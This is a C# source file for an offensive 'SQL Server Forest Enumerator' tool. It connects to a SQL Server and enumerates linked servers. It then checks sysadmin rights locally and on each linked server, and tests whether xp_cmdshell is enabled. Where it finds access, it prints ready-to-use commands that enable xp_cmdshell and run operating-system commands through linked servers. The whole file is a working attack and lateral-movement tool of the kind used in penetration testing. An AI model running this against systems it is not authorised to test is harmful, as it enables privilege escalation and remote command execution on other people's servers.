using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;

namespace SQLServerForestEnum
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("SQL Server Forest Enumerator");
            Console.WriteLine("============================");
            
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: SQLServerForestEnum.exe <sqlserver> [database]");
                Console.WriteLine("  <sqlserver>: SQL Server instance to connect to (e.g. dc01.corp2.com)");
                Console.WriteLine("  [database]: Optional database name (default: master)");
                return;
            }
            
            string sqlServer = args[0];
            string database = args.Length > 1 ? args[1] : "master";
            
            try
            {
                // Connect to the SQL Server
                using (SqlConnection connection = ConnectToSqlServer(sqlServer, database))
                {
                    // Check authentication status
                    CheckAuthenticationStatus(connection);
                    
                    // Enumerate linked servers
                    List<string> linkedServers = EnumerateLinkedServers(connection);
                    
                    // Check permissions on linked servers
                    CheckLinkedServerPermissions(connection, linkedServers);
                    
                    // Check if command execution is possible
                    CheckCommandExecution(connection);
                    
                    // Check for linked server command execution
                    CheckLinkedServerCommandExecution(connection, linkedServers);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }
        
        static SqlConnection ConnectToSqlServer(string sqlServer, string database)
        {
            Console.WriteLine($"[*] Attempting to connect to {sqlServer}...");
            
            string connectionString = $"Server={sqlServer};Database={database};Integrated Security=True;";
            SqlConnection connection = new SqlConnection(connectionString);
            
            try
            {
                connection.Open();
                Console.WriteLine($"[+] Successfully connected to {sqlServer}");
                return connection;
            }
            catch (Exception)
            {
                Console.WriteLine($"[-] Failed to connect to {sqlServer}");
                throw;
            }
        }
        
        static void CheckAuthenticationStatus(SqlConnection connection)
        {
            Console.WriteLine("\n[*] Checking authentication status...");
            
            string query = @"
                SELECT 
                    SYSTEM_USER as [Login],
                    IS_SRVROLEMEMBER('sysadmin') as [IsSysAdmin],
                    IS_SRVROLEMEMBER('public') as [IsPublic]
            ";
            
            using (SqlCommand command = new SqlCommand(query, connection))
            {
                using (SqlDataReader reader = command.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        string login = reader["Login"].ToString();
                        bool isSysAdmin = Convert.ToBoolean(reader["IsSysAdmin"]);
                        bool isPublic = Convert.ToBoolean(reader["IsPublic"]);
                        
                        Console.WriteLine($"[+] Authenticated as: {login}");
                        Console.WriteLine($"[+] Is member of sysadmin role: {(isSysAdmin ? "YES" : "NO")}");
                        Console.WriteLine($"[+] Is member of public role: {(isPublic ? "YES" : "NO")}");
                    }
                }
            }
        }
        
        static List<string> EnumerateLinkedServers(SqlConnection connection)
        {
            Console.WriteLine("\n[*] Enumerating linked servers...");
            List<string> linkedServers = new List<string>();
            
            string query = "EXEC sp_linkedservers";
            
            using (SqlCommand command = new SqlCommand(query, connection))
            {
                try
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string server = reader[0].ToString();
                            linkedServers.Add(server);
                            Console.WriteLine($"[+] Found linked SQL server: {server}");
                        }
                    }
                    
                    if (linkedServers.Count == 0)
                    {
                        Console.WriteLine("[-] No linked servers found");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error enumerating linked servers: {ex.Message}");
                }
            }
            
            return linkedServers;
        }
        
        static void CheckLinkedServerPermissions(SqlConnection connection, List<string> linkedServers)
        {
            if (linkedServers.Count == 0)
                return;
                
            Console.WriteLine("\n[*] Checking permissions on linked servers...");
            
            foreach (string server in linkedServers)
            {
                try
                {
                    string query = $"SELECT SYSTEM_USER as [LoginOnCurrentServer]";
                    using (SqlCommand command = new SqlCommand(query, connection))
                    {
                        using (SqlDataReader reader = command.ExecuteReader())
                        {
                            if (reader.Read())
                            {
                                string currentLogin = reader["LoginOnCurrentServer"].ToString();
                                Console.WriteLine($"[+] Executing as the login {currentLogin} on {connection.DataSource}");
                            }
                        }
                    }
                    
                    // Check login context on linked server
                    query = $"SELECT * FROM OPENQUERY([{server}], 'SELECT SYSTEM_USER as [LoginOnLinkedServer]')";
                    using (SqlCommand command = new SqlCommand(query, connection))
                    {
                        try
                        {
                            using (SqlDataReader reader = command.ExecuteReader())
                            {
                                if (reader.Read())
                                {
                                    string linkedLogin = reader["LoginOnLinkedServer"].ToString();
                                    Console.WriteLine($"[+] Executing as the login {linkedLogin} on {server}");
                                    
                                    // Check if linked login is sysadmin
                                    try
                                    {
                                        string adminQuery = $"SELECT * FROM OPENQUERY([{server}], 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as [IsSysAdmin]')";
                                        using (SqlCommand adminCommand = new SqlCommand(adminQuery, connection))
                                        {
                                            using (SqlDataReader adminReader = adminCommand.ExecuteReader())
                                            {
                                                if (adminReader.Read() && Convert.ToBoolean(adminReader["IsSysAdmin"]))
                                                {
                                                    Console.WriteLine($"[!] HIGH PRIVILEGE: Login {linkedLogin} on {server} has sysadmin role!");
                                                }
                                            }
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        // Unable to check sysadmin role
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[-] Cannot query linked server {server}: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error checking permissions on {server}: {ex.Message}");
                }
            }
        }
        
        static void CheckCommandExecution(SqlConnection connection)
        {
            Console.WriteLine("\n[*] Checking for command execution capability...");
            
            string query = "SELECT IS_SRVROLEMEMBER('sysadmin') as [IsSysAdmin]";
            
            using (SqlCommand command = new SqlCommand(query, connection))
            {
                try
                {
                    bool isSysAdmin = Convert.ToBoolean(command.ExecuteScalar());
                    
                    if (isSysAdmin)
                    {
                        Console.WriteLine("[!] You have sysadmin privileges - command execution is possible via xp_cmdshell");
                        
                        // Check if xp_cmdshell is enabled
                        query = "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell'";
                        command.CommandText = query;
                        int isEnabled = Convert.ToInt32(command.ExecuteScalar());
                        
                        if (isEnabled == 1)
                        {
                            Console.WriteLine("[+] xp_cmdshell is enabled");
                        }
                        else
                        {
                            Console.WriteLine("[-] xp_cmdshell is disabled but can be enabled with:");
                            Console.WriteLine("    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
                            Console.WriteLine("    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] You don't have sysadmin privileges - direct command execution is not possible");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error checking command execution capability: {ex.Message}");
                }
            }
        }
        
        static void CheckLinkedServerCommandExecution(SqlConnection connection, List<string> linkedServers)
        {
            if (linkedServers.Count == 0)
                return;
                
            Console.WriteLine("\n[*] Checking for command execution via linked servers...");
            
            foreach (string server in linkedServers)
            {
                try
                {
                    // Check if we have sysadmin on the linked server
                    string query = $"SELECT * FROM OPENQUERY([{server}], 'SELECT IS_SRVROLEMEMBER(''sysadmin'') as [IsSysAdmin]')";
                    
                    using (SqlCommand command = new SqlCommand(query, connection))
                    {
                        try
                        {
                            bool isSysAdmin = false;
                            
                            using (SqlDataReader reader = command.ExecuteReader())
                            {
                                if (reader.Read())
                                {
                                    isSysAdmin = Convert.ToBoolean(reader["IsSysAdmin"]);
                                }
                            }
                            
                            if (isSysAdmin)
                            {
                                Console.WriteLine($"[!] HIGH PRIVILEGE: You have sysadmin on linked server {server}");
                                Console.WriteLine($"[+] Command execution is possible through the linked server!");
                                Console.WriteLine($"[+] Example to execute commands:");
                                Console.WriteLine($"    EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE') AT [{server}]");
                                Console.WriteLine($"    EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [{server}]");
                                Console.WriteLine($"    EXEC ('EXEC master..xp_cmdshell ''whoami''') AT [{server}]");
                            }
                            else
                            {
                                Console.WriteLine($"[-] No sysadmin privileges on linked server {server}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[-] Error checking sysadmin on {server}: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error checking command execution on linked server {server}: {ex.Message}");
                }
            }
        }
    }
}
